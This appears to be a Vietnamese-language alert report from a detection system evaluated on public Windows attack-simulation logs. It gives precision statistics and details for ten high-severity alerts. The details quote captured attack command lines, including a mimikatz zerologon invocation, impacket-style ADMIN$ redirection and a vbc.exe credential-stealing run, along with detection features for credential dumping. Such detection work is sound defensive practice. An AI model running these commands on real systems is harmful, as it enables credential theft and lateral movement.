# Cảnh báo

- 65,559 event đầu vào, 8,251 event bị báo độc hại → **103 cảnh báo**
- nối event: cùng cây process / PID / phiên đăng nhập trên cùng máy, hoặc cách nhau ≤ 60s; cắt khi lặng > 1800s
- mức độ: high 61, medium 36, low 6

## So với nhãn

- cảnh báo đúng (có ít nhất 1 event độc hại thật): 91/103 (precision theo cảnh báo 0.883); cảnh báo sai theo mức độ: {'medium': 6, 'high': 4, 'low': 2}
- event độc hại thật nằm trong cảnh báo: 0.939 (7792/8302)
- file có tấn công được cảnh báo: 72/75

## Danh sách

| ID | Mức | Máy | Bắt đầu | Thời lượng | Event | Chuỗi tactic | Process chính | p max |
|---|---|---|---|---|---|---|---|---|
| A0001 | high | WORKSTATION5.theshire.local | 2020-08-07 18:32:07 | 110s | 4320 | command-and-control → credential-access → persistence → execution → privilege-escalation → defense-evasion → lateral-movement | powershell.exe (190) | 1.00 |
| A0002 | high | WORKSTATION5.theshire.local | 2020-09-22 06:16:00 | 167s | 1671 | command-and-control → execution → credential-access → lateral-movement → defense-evasion → privilege-escalation → discovery | powershell.exe (95) | 1.00 |
| A0003 | high | WORKSTATION5.theshire.local | 2020-09-22 07:45:13 | 85s | 612 | command-and-control → credential-access → execution → lateral-movement | powershell.exe (23) | 1.00 |
| A0004 | high | WORKSTATION5 | 2020-11-02 21:39:11 | 2s | 88 | credential-access → privilege-escalation → defense-evasion → lateral-movement → command-and-control → persistence | seatbelt.exe (65) | 1.00 |
| A0005 | high | WORKSTATION5.theshire.local | 2020-09-17 03:40:02 | 3s | 54 | lateral-movement → discovery → defense-evasion → privilege-escalation → execution → persistence | mimikatz.exe (23) | 1.00 |
| A0006 | high | WORKSTATION5.theshire.local | 2020-10-09 21:33:45 | 73s | 43 | privilege-escalation → execution → discovery → lateral-movement → persistence → defense-evasion | cmd.exe (12) | 1.00 |
| A0007 | high | IEWIN7 | 2019-06-14 22:22:17 | 95s | 23 | persistence → defense-evasion → lateral-movement → credential-access → command-and-control → execution → privilege-escalation | a.exe (6) | 1.00 |
| A0008 | high | MSEDGEWIN10 | 2020-10-17 11:43:27 | 22s | 18 | defense-evasion → credential-access → execution | test.exe (8) | 1.00 |
| A0009 | high | IEWIN7 | 2019-04-30 20:35:11 | 2s | 8 | lateral-movement → persistence → defense-evasion → discovery → execution | cmd.exe (3) | 1.00 |
| A0010 | high | MSEDGEWIN10 | 2019-08-03 13:50:26 | 2s | 8 | privilege-escalation → execution → persistence | mmc.exe (2) | 1.00 |
| A0011 | high | MSEDGEWIN10 | 2021-12-07 17:33:01 | 0s | 7 | privilege-escalation → lateral-movement | malseclogon.exe (6) | 1.00 |
| A0012 | high | IEWIN7 | 2019-04-30 20:26:51 | 1s | 6 | lateral-movement → persistence → command-and-control | powershell.exe (4) | 1.00 |
| A0013 | high | IEWIN7 | 2019-05-10 13:32:48 | 41s | 4 | privilege-escalation → execution | python.exe (2) | 1.00 |
| A0014 | high | MSEDGEWIN10 | 2019-08-30 12:54:07 | 1s | 4 | execution → persistence → defense-evasion | rundll32.exe (3) | 1.00 |
| A0015 | high | IEWIN7 | 2019-05-23 16:48:35 | 33s | 3 | privilege-escalation → execution | spoolsv.exe (1) | 1.00 |
| A0016 | high | PC01.example.corp | 2019-03-19 20:35:24 | 3954s | 101 | command-and-control → privilege-escalation → persistence → defense-evasion → execution | sdbinst.exe (17) | 1.00 |
| A0017 | high | PC01.example.corp | 2019-03-19 23:13:02 | 638s | 44 | command-and-control → privilege-escalation → persistence → defense-evasion → execution | calc.exe (11) | 1.00 |
| A0018 | high | LAPTOP-JU4M3I0E | 2021-01-26 13:21:13 | 20s | 18 | privilege-escalation → lateral-movement → execution → persistence | msbuild.exe (14) | 1.00 |
| A0019 | high | IEWIN7 | 2019-05-11 17:57:49 | 65s | 17 | privilege-escalation → execution → persistence → credential-access | wmic.exe (6) | 1.00 |
| A0020 | high | IEWIN7 | 2019-05-09 02:52:18 | 5s | 15 | privilege-escalation → execution → defense-evasion | wusa.exe (8) | 1.00 |
| A0021 | high | PC01.example.corp | 2019-03-19 17:22:24 | 1125s | 13 | persistence → command-and-control → execution → privilege-escalation → defense-evasion | ui0detect.exe (4) | 1.00 |
| A0022 | high | WORKSTATION5.theshire.local | 2020-10-12 22:33:11 | 87s | 107 | defense-evasion → execution → lateral-movement → privilege-escalation → persistence → discovery → command-and-control | notepad.exe (52) | 1.00 |
| A0023 | high | MSEDGEWIN10 | 2019-08-03 11:23:15 | 2s | 11 | privilege-escalation → persistence → execution | werfault.exe (3) | 1.00 |
| A0024 | high | IEWIN7 | 2019-05-26 04:01:42 | 5s | 9 | persistence → defense-evasion → privilege-escalation | jjs.exe (7) | 1.00 |
| A0025 | high | MSEDGEWIN10 | 2020-05-02 18:01:52 | 5s | 7 | privilege-escalation → persistence | printspoofer.exe (4) | 1.00 |
| A0026 | high | MSEDGEWIN10 | 2020-02-10 10:08:24 | 3s | 3 | credential-access → defense-evasion | ppldump.exe (3) | 1.00 |
| A0027 | high | WORKSTATION5 | 2020-10-22 05:54:21 | 7s | 265 | command-and-control → execution → lateral-movement → defense-evasion → persistence → privilege-escalation → discovery | svchost.exe (170) | 1.00 |
| A0028 | high | WORKSTATION6.theshire.local | 2020-08-06 07:56:29 | 13s | 116 | execution → lateral-movement → privilege-escalation → command-and-control → defense-evasion | grunthttp2.exe (69) | 1.00 |
| A0029 | high | MSEDGEWIN10 | 2021-06-09 04:58:49 | 0s | 1 | persistence |  | 1.00 |
| A0030 | high | MSEDGEWIN10 | 2021-06-09 05:18:11 | 0s | 1 | persistence |  | 1.00 |
| A0031 | high | LAPTOP-JU4M3I0E | 2020-11-26 17:38:11 | 1s | 6 | privilege-escalation → persistence → execution | byeintegrity5-uac.exe (5) | 1.00 |
| A0032 | high | MSEDGEWIN10 | 2020-03-21 21:45:04 | 0s | 3 | defense-evasion → persistence → execution | powershell.exe (2) | 1.00 |
| A0033 | high | WORKSTATION5.theshire.local | 2020-08-05 06:10:01 | 8s | 11 | lateral-movement → discovery → command-and-control → execution | grunthttp.exe (9) | 1.00 |
| A0034 | high | WORKSTATION5.theshire.local | 2020-08-06 07:56:22 | 20s | 9 | execution → command-and-control → lateral-movement → discovery | grunthttp.exe (5) | 1.00 |
| A0035 | high | MSEDGEWIN10 | 2020-10-01 18:35:02 | 0s | 2 | privilege-escalation → defense-evasion | poc.exe (2) | 1.00 |
| A0036 | high | MSEDGEWIN10 | 2020-08-12 13:04:27 | 101s | 17 | privilege-escalation → persistence → execution | cmd.exe (9) | 1.00 |
| A0037 | high | WORKSTATION5.theshire.local | 2020-08-06 07:20:03 | 21s | 9 | command-and-control → lateral-movement → discovery | grunthttp.exe (9) | 1.00 |
| A0038 | high | IT001.shire.com | 2019-12-05 04:47:55 | 0s | 3 | lateral-movement → persistence |  | 1.00 |
| A0039 | high | WORKSTATION5 | 2020-10-18 06:17:03 | 8s | 170 | defense-evasion → persistence → lateral-movement | wmic.exe (97) | 1.00 |
| A0040 | high | IEWIN7 | 2019-05-24 01:33:53 | 0s | 3 | privilege-escalation → discovery | cmd.exe (1) | 1.00 |
| A0041 | high | MSEDGEWIN10 | 2020-03-08 22:11:34 | 0s | 2 | credential-access | cscript.exe (2) | 1.00 |
| A0042 | high | IEWIN7 | 2019-05-11 17:10:06 | 5s | 6 | defense-evasion → privilege-escalation → persistence → command-and-control | wusa.exe (2) | 1.00 |
| A0043 | high | PC01.example.corp | 2019-02-13 18:03:28 | 111s | 11 | defense-evasion → command-and-control → lateral-movement → discovery → persistence | plink.exe (4) | 1.00 |
| A0044 | high | MSEDGEWIN10 | 2020-03-21 12:35:35 | 33s | 8 | privilege-escalation → lateral-movement → discovery → defense-evasion → persistence | nc.exe (3) | 1.00 |
| A0045 | high | MSEDGEWIN10 | 2020-03-21 05:00:16 | 29s | 5 | execution → persistence → privilege-escalation | usoclient.exe (1) | 1.00 |
| A0046 | high | WIN-77LTAPHIQ1R.example.corp | 2019-03-19 00:02:00 | 17s | 28 | defense-evasion → privilege-escalation → discovery → lateral-movement → execution → persistence | - (4) | 1.00 |
| A0047 | high | WORKSTATION5 | 2020-10-22 03:28:11 | 0s | 10 | persistence → defense-evasion → discovery → execution | reg.exe (8) | 1.00 |
| A0048 | high | PC01.example.corp | 2019-03-18 11:06:25 | 1240s | 5 | defense-evasion → command-and-control → persistence | svchost.exe (1) | 0.99 |
| A0049 | high | 2012r2srv.maincorp.local | 2017-06-12 23:39:43 | 0s | 3 | discovery → privilege-escalation → defense-evasion | lsass.exe (2) | 0.99 |
| A0050 | high | WIN-77LTAPHIQ1R.example.corp | 2019-03-18 22:15:49 | 0s | 4 | discovery → defense-evasion | - (4) | 0.99 |
| A0051 | high | MORDORDC.theshire.local | 2020-09-17 03:40:05 | 29s | 3 | privilege-escalation → discovery | system (2) | 0.99 |
| A0052 | high | PC04.example.corp | 2019-03-17 19:37:11 | 0s | 1 | credential-access | mimikatz.exe (1) | 0.97 |
| A0053 | high | MORDORDC.theshire.local | 2020-08-06 07:20:17 | 61s | 10 | persistence → defense-evasion → discovery | cmd.exe (5) | 0.97 |
| A0054 | high | MSEDGEWIN10 | 2020-10-17 22:52:29 | 36s | 17 | discovery → persistence → privilege-escalation → defense-evasion | system (7) | 0.95 |
| A0055 | high | WORKSTATION6.theshire.local | 2020-08-06 07:20:24 | 52s | 37 | discovery → lateral-movement → execution | services.exe (32) | 0.94 |
| A0056 | high | MORDORDC.theshire.local | 2020-09-22 06:16:28 | 0s | 6 | discovery → lateral-movement | services.exe (3) | 0.94 |
| A0057 | high | WORKSTATION6.theshire.local | 2020-10-09 21:34:16 | 42s | 13 | discovery → lateral-movement → privilege-escalation → defense-evasion → command-and-control | notepad.exe (5) | 0.93 |
| A0058 | high | IEWIN7 | 2019-04-30 07:23:00 | 0s | 45 | privilege-escalation → credential-access | m.exe (45) | 0.92 |
| A0059 | high | MORDORDC.theshire.local | 2020-08-05 06:09:48 | 19s | 9 | discovery → persistence | system (6) | 0.92 |
| A0060 | high | MORDORDC.theshire.local | 2020-10-09 21:35:24 | 11s | 99 | lateral-movement → persistence | wmiprvse.exe (20) | 0.92 |
| A0061 | high | IEWIN7 | 2019-05-15 04:18:40 | 0s | 1 | lateral-movement | wmiprvse.exe (1) | 0.91 |
| A0062 | medium | MSEDGEWIN10 | 2019-08-14 11:53:29 | 0s | 3 | execution | explorer.exe (2) | 1.00 |
| A0063 | medium | MSEDGEWIN10 | 2020-09-09 13:18:23 | 4s | 3 | lateral-movement | chrome.exe (3) | 1.00 |
| A0064 | medium | MSEDGEWIN10 | 2019-08-03 10:14:02 | 6s | 9 | privilege-escalation | explorer.exe (3) | 1.00 |
| A0065 | medium | IEWIN7 | 2019-04-30 07:46:15 | 0s | 1 | privilege-escalation | cmd.exe (1) | 1.00 |
| A0066 | medium | MSEDGEWIN10 | 2019-11-03 13:51:56 | 0s | 1 | persistence | cmd.exe (1) | 1.00 |
| A0067 | medium | MSEDGEWIN10 | 2020-07-04 14:18:58 | 0s | 1 | persistence | a.exe (1) | 1.00 |
| A0068 | medium | MSEDGEWIN10 | 2019-11-04 13:46:01 | 0s | 10 | lateral-movement |  | 0.99 |
| A0069 | medium | MSEDGEWIN10 | 2019-08-14 12:48:15 | 0s | 1 | lateral-movement | mimikatz.exe (1) | 0.99 |
| A0070 | medium | WIN-77LTAPHIQ1R.example.corp | 2019-03-19 00:41:28 | 0s | 1 | discovery |  | 0.99 |
| A0071 | medium | DC1.insecurebank.local | 2019-05-08 02:10:43 | 0s | 3 | persistence |  | 0.98 |
| A0072 | medium | MORDORDC.theshire.local | 2020-08-07 18:33:41 | 0s | 3 | defense-evasion | svchost.exe (2) | 0.98 |
| A0073 | medium | MORDORDC.theshire.local | 2020-09-22 07:45:18 | 18s | 4 | discovery | system (2) | 0.98 |
| A0074 | medium | IEWIN7 | 2019-04-30 10:12:45 | 0s | 1 | persistence | cmd.exe (1) | 0.97 |
| A0075 | medium | IEWIN7 | 2019-05-14 00:32:19 | 15s | 2 | lateral-movement | explorer.exe (2) | 0.96 |
| A0076 | medium | IEWIN7 | 2019-05-14 00:29:48 | 0s | 1 | lateral-movement | explorer.exe (1) | 0.96 |
| A0077 | medium | MSEDGEWIN10 | 2020-06-30 20:50:25 | 0s | 1 | defense-evasion | za3bollo.exe (1) | 0.96 |
| A0078 | medium | LAPTOP-JU4M3I0E | 2020-07-24 17:20:29 | 0s | 1 | lateral-movement | frida-winjector-helper-32.exe (1) | 0.95 |
| A0079 | medium | MSEDGEWIN10 | 2020-07-09 21:49:03 | 49s | 4 | lateral-movement |  | 0.92 |
| A0080 | medium | MSEDGEWIN10 | 2020-07-09 21:55:18 | 46s | 4 | lateral-movement |  | 0.92 |
| A0081 | medium | MSEDGEWIN10 | 2020-07-09 22:00:10 | 48s | 4 | lateral-movement |  | 0.92 |
| A0082 | medium | MSEDGEWIN10 | 2020-07-09 21:28:47 | 37s | 3 | lateral-movement |  | 0.92 |
| A0083 | medium | MSEDGEWIN10 | 2020-07-09 19:47:00 | 0s | 1 | lateral-movement |  | 0.92 |
| A0084 | medium | MSEDGEWIN10 | 2020-07-09 20:06:31 | 0s | 1 | lateral-movement |  | 0.92 |
| A0085 | medium | MSEDGEWIN10 | 2020-07-09 20:43:29 | 0s | 1 | lateral-movement |  | 0.92 |
| A0086 | medium | MSEDGEWIN10 | 2020-07-09 21:07:05 | 0s | 1 | lateral-movement |  | 0.92 |
| A0087 | medium | MSEDGEWIN10 | 2020-07-09 21:30:53 | 0s | 1 | lateral-movement |  | 0.92 |
| A0088 | medium | MSEDGEWIN10 | 2020-07-10 10:20:33 | 0s | 1 | lateral-movement |  | 0.92 |
| A0089 | medium | MSEDGEWIN10 | 2019-09-03 11:33:22 | 0s | 1 | discovery | system (1) | 0.91 |
| A0090 | medium | MSEDGEWIN10 | 2019-09-03 11:34:35 | 0s | 1 | discovery | system (1) | 0.91 |
| A0091 | medium | WORKSTATION6.theshire.local | 2020-08-05 06:10:07 | 1s | 6 | execution |  | 0.91 |
| A0092 | medium | WORKSTATION6.theshire.local | 2020-09-22 06:16:07 | 0s | 1 | lateral-movement | services.exe (1) | 0.89 |
| A0093 | medium | 02694w-win10.threebeesco.com | 2020-10-06 22:11:17 | 0s | 3 | discovery | system (3) | 0.87 |
| A0094 | medium | MSEDGEWIN10 | 2020-12-10 11:18:54 | 0s | 2 | persistence → lateral-movement | wmiprvse.exe (2) | 0.86 |
| A0095 | medium | MSEDGEWIN10 | 2019-09-22 11:22:05 | 74s | 2 | discovery |  | 0.86 |
| A0096 | medium | HFDC01.shire.com | 2019-12-05 04:47:45 | 72s | 4 | defense-evasion → discovery | system (2) | 0.68 |
| A0097 | medium | MORDORDC.theshire.local | 2020-08-06 07:56:19 | 9s | 3 | discovery | system (3) | 0.68 |
| A0098 | low | PC01.example.corp | 2019-02-13 18:01:41 | 23s | 2 | defense-evasion → command-and-control | winlogon.exe (1) | 0.78 |
| A0099 | low | DC1.insecurebank.local | 2019-05-14 17:31:27 | 0s | 1 | discovery | system (1) | 0.76 |
| A0100 | low | MSEDGEWIN10 | 2020-07-03 08:55:46 | 0s | 1 | command-and-control |  | 0.56 |
| A0101 | low | MSEDGEWIN10 | 2019-09-03 11:04:05 | 49s | 2 | privilege-escalation | svchost.exe (2) | 0.55 |
| A0102 | low | PC01.example.corp | 2019-03-19 21:10:34 | 0s | 1 | privilege-escalation | taskhost.exe (1) | 0.52 |
| A0103 | low | PC01.example.corp | 2019-03-19 21:00:01 | 0s | 1 | privilege-escalation | wsqmcons.exe (1) | 0.52 |

## Chi tiết

### A0001 · high · WORKSTATION5.theshire.local

- thời gian: 2020-08-07 18:32:07 → 18:33:57 UTC, 4320 event, 5 process
- tactic: credential-access (3589); command-and-control (460); execution (124); lateral-movement (53); persistence (42); privilege-escalation (36); defense-evasion (16)
- process: powershell.exe (190), notepad.exe (122); user: pgustavo
- file log: labels__mordor__defense_evasion__host__empire_psinject_PEinjection__empire_psinject_PEinjection_2020-08-07143205.json
- **vì sao báo:**
  - lệnh mã hoá base64 (`f_encoded`, 3857 event)
  - PowerShell chạy ẩn / bỏ qua execution policy (`f_hidden_ps`, 3853 event)
  - nạp code vào bộ nhớ (reflection, VirtualAlloc) (`f_reflection`, 116 event)
  - tải file / script từ mạng (`f_download`, 65 event)
  - khoá Winlogon (`k_winlogon`, 6 event)
  - inject vào process khác (`f_proc_inject`, 5 event) ⚠
  - nạp module không ký (`b_unsigned_module`, 4 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 4 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 18:33:52 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 18:33:52 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 18:33:52 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 18:33:52 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 18:33:52 | PowerShell 4103 |  | 1.00 | command-and-control |  |

### A0002 · high · WORKSTATION5.theshire.local

- thời gian: 2020-09-22 06:16:00 → 06:18:46 UTC, 1671 event, 11 process
- tactic: command-and-control (819); credential-access (668); lateral-movement (142); execution (18); defense-evasion (14); privilege-escalation (8); discovery (2)
- process: powershell.exe (95), wmiprvse.exe (8), services.exe (1); user: pgustavo
- file log: labels__mordor__discovery__host__empire_find_localadmin_smb_svcctl_OpenSCManager__empire_find_localadmin_smb_svcctl_OpenSCManager_2020-09-22021559.json
- **vì sao báo:**
  - lệnh mã hoá base64 (`f_encoded`, 1549 event)
  - PowerShell chạy ẩn / bỏ qua execution policy (`f_hidden_ps`, 1549 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 187 event)
  - tải file / script từ mạng (`f_download`, 82 event)
  - nạp code vào bộ nhớ (reflection, VirtualAlloc) (`f_reflection`, 22 event)
  - thực thi trên máy khác (WMI, WinRM, PsExec, DCOM) (`f_remote_target`, 18 event)
  - công cụ đánh cắp thông tin xác thực (mimikatz, kerberoast...) (`f_cred_tool`, 10 event) ⚠
  - biên dịch / nạp C# tại chỗ (`f_dotnet_inline`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 06:18:46 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 06:18:46 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 06:18:46 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 06:16:00 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 06:18:41 | PowerShell 4103 |  | 1.00 | command-and-control |  |

### A0003 · high · WORKSTATION5.theshire.local

- thời gian: 2020-09-22 07:45:13 → 07:46:37 UTC, 612 event, 6 process
- tactic: credential-access (293); command-and-control (291); lateral-movement (20); execution (8)
- process: powershell.exe (23), officeclicktorun.exe (20); user: pgustavo
- file log: labels__mordor__discovery__host__empire_getsession_dcerpc_smb_srvsvc_NetSessEnum__empire_getsession_dcerpc_smb_srvsvc_NetSessEnum_2020-09-22034513.json
- **vì sao báo:**
  - lệnh mã hoá base64 (`f_encoded`, 561 event)
  - PowerShell chạy ẩn / bỏ qua execution policy (`f_hidden_ps`, 561 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 72 event)
  - tải file / script từ mạng (`f_download`, 38 event)
  - nạp code vào bộ nhớ (reflection, VirtualAlloc) (`f_reflection`, 2 event)
  - thực thi trên máy khác (WMI, WinRM, PsExec, DCOM) (`f_remote_target`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 07:46:37 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 07:46:37 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 07:46:32 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 07:46:32 | PowerShell 4103 |  | 1.00 | command-and-control |  |
| 07:46:32 | PowerShell 800 |  | 1.00 | command-and-control |  |

### A0004 · high · WORKSTATION5

- thời gian: 2020-11-02 21:39:11 → 21:39:13 UTC, 88 event, 5 process
- tactic: defense-evasion (69); lateral-movement (7); credential-access (6); privilege-escalation (2); command-and-control (2); persistence (2)
- process: seatbelt.exe (65), wmiprvse.exe (2), cmd.exe (1); user: wardog
- file log: labels__mordor__discovery__host__cmd_seatbelt_group_user__cmd_seatbelt_group_user_2020-11-0216391814.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 64 event)
  - nạp module không ký (`b_unsigned_module`, 5 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 2 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)
  - can thiệp Defender / firewall (`f_av_tamper`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 21:39:13 | Security 4656 | seatbelt.exe | 1.00 | defense-evasion |  |
| 21:39:13 | Security 4663 | seatbelt.exe | 1.00 | defense-evasion |  |
| 21:39:11 | Security 4663 | seatbelt.exe | 1.00 | defense-evasion |  |
| 21:39:11 | Security 4656 | seatbelt.exe | 1.00 | defense-evasion |  |
| 21:39:11 | Security 4658 | seatbelt.exe | 1.00 | defense-evasion |  |

### A0005 · high · WORKSTATION5.theshire.local

- thời gian: 2020-09-17 03:40:02 → 03:40:05 UTC, 54 event, 7 process
- tactic: lateral-movement (27); discovery (6); privilege-escalation (6); defense-evasion (5); execution (5); persistence (5)
- process: mimikatz.exe (23), cmd.exe (11), conhost.exe (8), grunthttp.exe (6), &lt;unknown process&gt; (3); user: pgustavo
- file log: labels__mordor__lateral_movement__host__mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2__mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2_2020-09-16233923.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 29 event)
  - khoá cấu hình service (`k_services`, 9 event)
  - biên dịch / nạp C# tại chỗ (`f_dotnet_inline`, 5 event)
  - công cụ đánh cắp thông tin xác thực (mimikatz, kerberoast...) (`f_cred_tool`, 5 event) ⚠
  - mở process với toàn quyền (`b_full_access`, 3 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 3 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 03:40:04 | Security 4658 | mimikatz.exe | 1.00 | lateral-movement |  |
| 03:40:04 | Security 4673 | mimikatz.exe | 1.00 | lateral-movement |  |
| 03:40:04 | Sysmon 1 | mimikatz.exe | 1.00 | lateral-movement | C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe  "lsadump::zerologon /target:MORDORDC.th |
| 03:40:04 | Security 4673 | mimikatz.exe | 1.00 | lateral-movement |  |
| 03:40:04 | Security 4658 | mimikatz.exe | 1.00 | lateral-movement |  |

### A0006 · high · WORKSTATION5.theshire.local

- thời gian: 2020-10-09 21:33:45 → 21:34:58 UTC, 43 event, 7 process
- tactic: execution (9); lateral-movement (8); privilege-escalation (7); defense-evasion (7); discovery (6); persistence (6)
- process: cmd.exe (12), wmic.exe (9), conhost.exe (8), grunthttp.exe (7), &lt;unknown process&gt; (3); user: pgustavo
- file log: labels__mordor__lateral_movement__host__covenant_wmi_wbemcomn_dll_hijack__covenant_wmi_wbemcomn_dll_hijack_2020-10-09173318.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 7 event)
  - thực thi trên máy khác (WMI, WinRM, PsExec, DCOM) (`f_remote_target`, 5 event)
  - khoá cấu hình service (`k_services`, 3 event)
  - mở process với toàn quyền (`b_full_access`, 3 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 3 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - can thiệp Defender / firewall (`f_av_tamper`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 21:34:57 | Sysmon 1 | cmd.exe | 1.00 | lateral-movement | "cmd.exe" /c wmic /node:WORKSTATION6 os get |
| 21:33:45 | Sysmon 11 | grunthttp.exe | 1.00 | privilege-escalation |  |
| 21:34:58 | Sysmon 1 | wmic.exe | 1.00 | execution | wmic  /node:WORKSTATION6 os get |
| 21:34:57 | Security 4688 | cmd.exe | 1.00 | lateral-movement | "cmd.exe" /c wmic /node:WORKSTATION6 os get |
| 21:34:57 | Sysmon 10 | grunthttp.exe | 0.99 | privilege-escalation |  |

### A0007 · high · IEWIN7

- thời gian: 2019-06-14 22:22:17 → 22:23:53 UTC, 23 event, 19 process
- tactic: command-and-control (6); execution (5); persistence (5); credential-access (2); defense-evasion (2); privilege-escalation (2); lateral-movement (1)
- process: a.exe (6), vbc.exe (2), logonui.exe (2), dllhost.exe (2), bre6bge2jubb.exe (2), smss.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Persistence__sysmon_13_1_persistence_via_winlogon_shell.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 8 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - khoá Winlogon (`k_winlogon`, 1 event)
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 22:22:17 | Sysmon 1 | a.exe | 1.00 | persistence | "C:\Users\IEUser\Downloads\a.exe"  |
| 22:22:21 | Sysmon 11 | a.exe | 1.00 | defense-evasion |  |
| 22:22:21 | Sysmon 13 | a.exe | 1.00 | lateral-movement |  |
| 22:22:21 | Sysmon 1 | a.exe | 1.00 | persistence | "C:\Users\IEUser\Downloads\a.exe" |
| 22:22:32 | Sysmon 1 | vbc.exe | 1.00 | credential-access | "C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe" /stext "C:\Users\IEUser\AppData\Local\Temp\t |

### A0008 · high · MSEDGEWIN10

- thời gian: 2020-10-17 11:43:27 → 11:43:49 UTC, 18 event, 7 process
- tactic: defense-evasion (12); execution (5); credential-access (1)
- process: test.exe (8), winword.exe (7), rundll32.exe (1), explorer.exe (1), cmd.exe (1); user: IEUser
- file log: labels__evtx__AutomatedTestingTools__Malware__sideloading_uacbypass_rundll32_injection_c2.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 15 event)
  - process con của Office (`b_child_of_office`, 4 event)
  - binary bị đổi tên (`b_renamed`, 2 event)
  - ghi file thực thi / script (`f_drop_exec`, 2 event)
  - shell / LOLBin do script host / Office / trình duyệt sinh ra (`b_shell_child_of_script`, 2 event)
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 11:43:34 | Sysmon 7 | winword.exe | 1.00 | defense-evasion |  |
| 11:43:33 | Sysmon 1 | winword.exe | 1.00 | defense-evasion | C:\Users\IEUser\AppData\Roaming\WINWORD.exe --xStart |
| 11:43:40 | Sysmon 8 | winword.exe | 1.00 | defense-evasion |  |
| 11:43:45 | Sysmon 1 | winword.exe | 1.00 | execution | "C:\Users\IEUser\AppData\Roaming\WINWORD.exe" |
| 11:43:36 | Sysmon 8 | winword.exe | 1.00 | execution |  |

### A0009 · high · IEWIN7

- thời gian: 2019-04-30 20:35:11 → 20:35:13 UTC, 8 event, 6 process
- tactic: lateral-movement (3); persistence (2); defense-evasion (1); discovery (1); execution (1)
- process: cmd.exe (3), system (2), mmc.exe (2), whoami.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Lateral Movement__LM_impacket_docmexec_mmc_sysmon_01.json
- **vì sao báo:**
  - truy cập share quản trị (ADMIN$, C$, IPC$) (`f_admin_share`, 4 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 20:35:13 | Sysmon 1 | cmd.exe | 1.00 | lateral-movement | "C:\Windows\System32\cmd.exe" /Q /c cd  1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1 |
| 20:35:13 | Sysmon 1 | cmd.exe | 1.00 | lateral-movement | "C:\Windows\System32\cmd.exe" /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1 |
| 20:35:12 | Sysmon 1 | cmd.exe | 1.00 | persistence | "C:\Windows\System32\cmd.exe" /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1 |
| 20:35:13 | Sysmon 1 | whoami.exe | 1.00 | execution | whoami  /all  |
| 20:35:11 | Sysmon 3 | mmc.exe | 1.00 | defense-evasion |  |

### A0010 · high · MSEDGEWIN10

- thời gian: 2019-08-03 13:50:26 → 13:50:28 UTC, 8 event, 5 process
- tactic: privilege-escalation (5); execution (2); persistence (1)
- process: mmc.exe (2), fubuki.exe (2), uacme.exe (1), explorer.exe (1), consent.exe (1), cmd.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Privilege Escalation__Sysmon_UACME_38.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 3 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - kết nối ra IP public (`b_public_dst`, 1 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:50:28 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | "C:\Windows\system32\cmd.exe" |
